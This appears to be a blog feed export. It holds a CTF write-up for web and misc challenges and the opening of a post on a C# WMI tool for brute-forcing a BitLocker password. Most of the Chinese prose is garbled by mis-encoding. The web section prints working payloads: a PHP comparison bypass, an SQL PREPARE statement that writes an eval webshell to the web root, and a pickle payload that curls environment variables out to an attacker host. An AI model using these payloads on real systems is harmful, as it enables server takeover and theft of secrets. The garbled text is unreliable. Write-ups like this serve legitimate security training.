ä»¥è½¬ä¹‰ã€‚è®¾ç½®ç¯å¢ƒå˜é‡çš„åœ°æ–¹è¿›è¡Œäº†ç®€å•çš„ md5 å’Œ sha1 éªŒè¯ï¼ŒåŒæ—¶å¯¹å‚æ•°é•¿åº¦å’Œåç§°åšå‡ºé™å®šã€‚</p><p><code>adminPassword</code> å¯ä»¥ç›´æ¥åˆ©ç”¨å˜é‡çš„å…¨å±€è®¾å®šè½»æ¾è¦†ç›–ï¼Œå› æ­¤å¾—åˆ°<code>password=LemonPrefect&amp;adminPassword=7f41a8661986fdd34d63d4cdde2249c5</code>ã€‚æŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼Œ<code>0e01000111101111110010010010000001001001</code> çš„ sha1 ä»ç„¶ä¸º <code>0e</code> å¼€å¤´ï¼Œè¿›è€Œè¾¾æˆ 0 == 0 çš„æ¯”è¾ƒã€‚åˆ©ç”¨ä¸€ä¸ªå…¨å±€å˜é‡åŠ ä¸€ä¸ªå°†è¢«æ‹¼æ¥æ‰§è¡Œçš„å˜é‡ <code>var1</code> å³å¯è¾¾æˆæŸ¥çœ‹ phpinfoã€‚åŒæ—¶ï¼Œ<code>var1</code> éœ€è¦é…åˆè¯­å¥çš„é—­åˆã€‚å› æ­¤ï¼Œæ„é€  <code>var1=\&quot;;$b();?&gt;</code>ï¼Œ<code>b=phpinfo</code>ã€‚</p><p>æ•´ç†ä¸Šè¿°å‚æ•°ï¼Œå¾—åˆ° payloadã€‚</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?password=LemonPrefect</span><br><span class="line">&amp;adminPassword=7f41a8661986fdd34d63d4cdde2249c5</span><br><span class="line">&amp;verif=0e01000111101111110010010010000001001001</span><br><span class="line">&amp;b=phpinfo </span><br><span class="line">&amp;var1=\&quot;;$b();?&gt; </span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°å‚æ•°æ„é€ è¯·æ±‚å‘é€å³å¯å¾—åˆ° phpinfoï¼Œåœ¨å…¶ä¸­å¯ä»¥æ‰¾åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122809152/05e7211282a1e1807f8e88a212a7f12c166c2e22.png" alt="image-20201115225456544"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;720731af-7dc9-45fa-b252-a82cc4601de9&#125;</span><br></pre></td></tr></table></figure><h3 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h3><p>çœ‹èµ·æ¥å¾ˆåƒäººç•œæ— å®³çš„éšä¾¿æ³¨ï¼Œç„¶è€Œéšä¾¿æ³¨çš„ä¸‰ç§å¥—è·¯éƒ½ä¸è¡Œã€‚å…³é”®åœ¨äº <code>PREPARE</code> ä¸åå…­è¿›åˆ¶çš„é…åˆã€‚ <code>PREPARE</code> å¯ä»¥æ„é€ å‡º <code>prepare d from 0x73656c6563742f2a2a2f223c3f70687020406576616c28245f504f53545b615d293b203f3e2220696e746f206f757466696c6520272f7661722f7777772f68746d6c2f612e70687027;execute d;</code> è¿™æ ·çš„è¯­å¥æ¥å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œä»è€Œç›´æ¥ getshellã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x73656c6563742f2a2a2f223c3f70687020406576616c28245f504f53545b615d293b203f3e2220696e746f206f757466696c6520272f7661722f7777772f68746d6c2f612e70687027</span><br><span class="line">&#x3D;&gt; select&#x2F;**&#x2F;&quot;&lt;?php @eval($_POST[a]); ?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&#39;</span><br></pre></td></tr></table></figure><p>getshell ä¹‹åç›´æ¥æ„é€  <code>system(&quot;cat /flag&quot;);</code> å¯å¾— flagã€‚</p><h3 id="easy-flask2"><a href="#easy-flask2" class="headerlink" title="easy_flask2"></a>easy_flask2</h3><blockquote><p><strong>pickle ååºåˆ—åŒ– å‚è€ƒ</strong></p><p><a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p></blockquote><p>ä» <code>/source</code> è·¯ç”±è¯»å–æºç ï¼Œå¯ä»¥å‘ç° flag å­˜æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­ã€‚åŒæ—¶å‘ç°å¯æ§çš„ pickle ååºåˆ—åŒ–ç‚¹ï¼Œç®€å•è¿‡æ»¤äº† <code>R</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if session.get(&#39;name&#39;):</span><br><span class="line">    if b&#39;R&#39; in base64.b64decode(request.cookies[&#39;pkl&#39;]):</span><br><span class="line">        return &quot;RCE??&quot;</span><br><span class="line">    person &#x3D; pickle.loads(base64.b64decode(request.cookies[&#39;pkl&#39;]))</span><br></pre></td></tr></table></figure><p>ä»å‚è€ƒå¤„è·å–ä¸å« <code>R</code> çš„ payloadï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ª curl è¯·æ±‚æ¥ä»æœåŠ¡ç«¯ä½¿ç”¨ <code>nc</code> ç›‘å¬æ¥è·å–æ–‡ä»¶å†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#39;&#39;&#39;(S&#39;curl  -F &quot;filename&#x3D;@&#x2F;proc&#x2F;self&#x2F;environ&quot; YOUR_HOST&#39;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§é¢˜ç›®çš„æ–¹å¼ï¼Œåœ¨ç™»é™†åå®šå‘åˆ° <code>/login</code> è·¯ç”±åï¼Œå°† payload base64 ç¼–ç åè®¾ç½®åˆ° <code>pkl</code> cookieã€‚åˆ·æ–°é¡µé¢ï¼Œå³å¯åœ¨ç›‘å¬å¤„è·å–åˆ°ç¯å¢ƒå˜é‡çš„å†…å®¹ï¼Œå…¶ä¸­åŒ…å« flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123024658/c30471900b24d94744e84eabb6cfcc2e9e4a2394.png" alt="image-20201115230937913"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;a1b56cec-8b90-4e22-a8e1-98069088bb13&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="é˜´é˜³äººç¼–ç "><a href="#é˜´é˜³äººç¼–ç " class="headerlink" title="é˜´é˜³äººç¼–ç "></a>é˜´é˜³äººç¼–ç </h3><p>å°† <code>å°±è¿™</code> <code>ä¸ä¼šå§</code> éƒ½æ›¿æ¢æˆ <code>Ook</code> å¹¶æ•´ç†ç¬¦å·åå¾—åˆ°å¦‚ä¸‹æ–‡æœ¬ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?</span><br><span class="line">Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure><p>å°†å…¶è§£ç åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9_zhe_Jiu_zhe_8_hui_8&#125;</span><br></pre></td></tr></table></figure><h3 id="YLBâ€™s-CAPTCHA-ç­¾åˆ°é¢˜"><a href="#YLBâ€™s-CAPTCHA-ç­¾åˆ°é¢˜" class="headerlink" title="YLBâ€™s CAPTCHA - ç­¾åˆ°é¢˜"></a>YLBâ€™s CAPTCHA - ç­¾åˆ°é¢˜</h3><p>éªŒè¯ç å›¾ç‰‡æˆªä¸‹æ¥ï¼ŒPS è°ƒæ•´è‰²é˜¶åˆ°èƒ½çœ‹å¾—å¾ˆæ¸…çš„ç¨‹åº¦ï¼Œç„¶åè¾“å…¥éªŒè¯ç ï¼Œç§¯ç´¯åä¸ªæ­£ç¡®æäº¤å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123272140/ff1b9e10381366286020a6f8b504080bb2938ac0.png" alt="image-20201115233514388"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123502272/c6fa4cc694961b245795b54f5f2229cb5e397cc1.png" alt="image-20201115233125644"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;cc95bcb8-f09e-4134-82d2-cb4446d5d93f&#125;</span><br></pre></td></tr></table></figure><h3 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h3><p>010editor æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰ä¸€ä¸ªé“¾æ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123625996/abd50ca76fc3fe323cfc90102204b333cc8981fe.png" alt="image-20201115232547446"></p><p>è®¿é—®é“¾æ¥ï¼Œåœ¨ B ç«™è¯„è®ºåŒºæ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;let&#39;s_study_pwn&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bitlocker çš„å¦ç±»è§£é”æ–¹å¼â€”â€”è®° WMI provider ä¸‹çš„ C# å¼€å‘</title>
      <link href="/zh-CN/posts/7ba1ed56.html"/>
      <url>/zh-CN/posts/7ba1ed56.html</url>
      
        <content type="html"><![CDATA[<p>åœ¨åš StartCTF çš„ Misc é¢˜çš„æ—¶å€™è£…ä¸ä¸Šçˆ†ç ´çš„å·¥å…·ï¼Œäºæ˜¯æ¢äº†ä¸€æ¡æ€è·¯ã€‚æ—¢ç„¶æ˜¯å¾®è½¯çš„ä¸œè¥¿ï¼Œè‡ªç„¶å¯ä»¥ C# ä¸€æŠŠæ¢­å†™ä¸€ä¸ªçˆ†ç ´å°å·¥å…·ï¼Œäºæ˜¯æ‰¾åˆ° <code>Win32_EncryptableVolume</code> æ–‡æ¡£é¡ºå¸¦æŸ¥äº†ä¸€äº›èµ„æ–™å°±å¼€å¹²äº†ã€‚</p><p><escape><span id="more"></span></escape></p><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><h3 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h3><p>æ—¢ç„¶æ˜¯è¦è·Ÿ WMI provider æ‰“äº¤é“ï¼ŒWMI CRUD æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œäºæ˜¯æ‰¾äº†ä¸ªè½®å­ã€‚</p><p><a href="https://github.com/nicoriff/ORMi">ORMi</a></p><p>Microsoft Docs</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secprov/win32-encryptablevolume">https://docs.microsoft.com/en-us/windows/win32/secprov/win32-encryptablevolume</a></p><p>Stack Overflow å‚è€ƒ</p><p><a href="https://stackoverflow.com/questions/56360904/bitlocker-values">https://stackoverflow.com/questions/56360904/bitlocker-values</a></p><h3 id="ç¡®è®¤æœåŠ¡å¼€å¯"><a href="#ç¡®è®¤æœåŠ¡å¼€å¯" class="headerlink" title="ç¡®è®¤æœåŠ¡å¼€å¯"></a>ç¡®è®¤æœåŠ¡å¼€å¯</h3><p>WMI Performance Adapter(wmiApSrv)ã€BitLocker Drive Encryption Service(BDESVC) éœ€è¦ä¿æŒæ­£åœ¨è¿è¡Œçš„çŠ¶æ€ã€‚</p><h3 id="æŒ‚è½½ç£ç›˜"><a href="#æŒ‚è½½ç£ç›˜" class="headerlink" title="æŒ‚è½½ç£ç›˜"></a>æŒ‚è½½ç£ç›˜</h3><p>å°† vhdx è™šæ‹Ÿç£ç›˜æ–‡ä»¶æŒ‚è½½åˆ°è®¡ç®—æœºä¸­ã€‚</p><h2 id="æŒ‰ç…§æ–‡æ¡£æ„å»º"><a href="#æŒ‰ç…§æ–‡æ¡£æ„å»º" class="headerlink" title="æŒ‰ç…§æ–‡æ¡£æ„å»º"></a>æŒ‰ç…§æ–‡æ¡£æ„å»º</h2><h3 id="ç¡®å®š-helper-scope"><a href="#ç¡®å®š-helper-scope" class="headerlink" title="ç¡®å®š helper scope"></a>ç¡®å®š helper scope</h3><p>ä»æ–‡æ¡£çš„ <strong>Requirements</strong>  æŸ¥é˜…å¯çŸ¥ <code>Win32_EncryptableVolume</code> ä½äº <code>Root\CIMV2\Security\MicrosoftVolumeEncryption</code>ã€‚äºæ˜¯è¿æ¥è‡³ WMI æ—¶éœ€è¦å°† scope å¯¹åº”ç€æ›´æ”¹ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIHelper helper = <span class="keyword">new</span> WMIHelper(<span class="string">&quot;Root\\CIMV2\\Security\\MicrosoftVolumeEncryption&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="æ„å»ºç±»"><a href="#æ„å»ºç±»" class="headerlink" title="æ„å»ºç±»"></a>æ„å»ºç±»</h3><p>ORMi æä¾›äº† <code>[WMIClass()]</code> çš„ attribute ç”¨æ¥ç»™ç±»æŒ‡å®šåˆ«åï¼Œ<code>[WMIProperty()]</code> ç”¨æ¥ç»™å±æ€§æŒ‡å®šåˆ«åã€‚åœ¨æœªæŒ‡å®šåˆ«åæ—¶ï¼Œåç§°éœ€è¦ä¸æ–‡æ¡£ä¸­ä¿æŒä¸€è‡´ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">WMIClass(<span class="meta-string">&quot;Win32_EncryptableVolume&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EncryptableVolume</span> : <span class="title">WMIInstance</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DeviceID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> PersistentVolumeID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DriveLetter &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> ProtectionStatus &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å†™æ–¹æ³•"><a href="#å†™æ–¹æ³•" class="headerlink" title="å†™æ–¹æ³•"></a>å†™æ–¹æ³•</h3><p>æ–‡æ¡£ä¸­æä¾›äº†å‡ ç§ç”¨äºè§£é”çš„æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UnlockWithAdSid : ä½¿ç”¨ Active Directory security identifier (SID) è·å– key</span><br><span class="line">UnlockWithCertificateFile : ä½¿ç”¨è¯ä¹¦æ–‡ä»¶åŠå…¶å¯†ç </span><br><span class="line">UnlockWithCertificateThumbprint : ä½¿ç”¨ CertThumbprint å’Œè¯ä¹¦å¯†ç </span><br><span class="line">UnlockWithExternalKey : ä½¿ç”¨ 256 ä½çš„å¤–éƒ¨ key</span><br><span class="line">UnlockWithNumericalPassword : ä½¿ç”¨ 48 ä½çš„å­—ç¬¦ä¸²</span><br><span class="line">UnlockWithPassphrase : ä½¿ç”¨é©±åŠ¨å™¨å¯†ç </span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡‡ç”¨çš„æ˜¯ <code>UnlockWithPassphrase</code> æ–¹æ³•æœ´ç´ åœ°ä½¿ç”¨é©±åŠ¨å™¨å¯†ç å»è§£é” BitLockerã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint32 GetLockStatus(</span><br><span class="line">  [out]Â uint32 LockStatus</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£é‡Œå¯¹äºå‚æ•°å’Œè¿”å›å€¼ç»™å‡ºäº†æ‰˜ç®¡å¯¹è±¡æ ¼å¼ï¼Œä½†æ˜¯å¹¶ä¸å¤ªæµ…æ˜¾ï¼Œè°ƒè¯•ä¹‹åå‘ç° <code>[out]</code> è¢«å¡è¿›äº†ä¸€ä¸ª <code>ExpandoObject</code>ï¼Œè€Œæ–‡æ¡£ä¸­æ ‡è¯†çš„ä¼ å…¥ <code>[in]</code> åˆ™æ˜¯ç›´æ¥ä»¥ Object çš„å½¢å¼ä¼ å…¥ã€‚</p><p>å› ä¸ºæ–¹æ³•çš„è¿”å›å€¼ä¸ºä¸€ä¸ª <code>ExpandoObject</code>ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ä¸€ä¸ªç±»æ¥æ¥æ”¶å€¼ã€‚åŒæ—¶éœ€è¦é…åˆ ORMiï¼Œä½¿ç”¨ <code>WMIMethod.ExecuteMethod</code> æ¥è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ã€‚è¿™é‡Œä¸»è¦éœ€è¦çš„æ˜¯åˆ¤æ–­ç£ç›˜å½“å‰ lock çŠ¶æ€ä»¥åŠä½¿ç”¨å¯†ç è§£é”çš„æ–¹æ³•ï¼Œå¯¹ç…§ç€æ–‡æ¡£å°†å…¶è¿˜åŸã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> LockStatus <span class="title">GetLockStatus</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;LockStatus&gt;(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LockStatus</span>&#123;</span><br><span class="line">    [<span class="meta">WMIProperty(<span 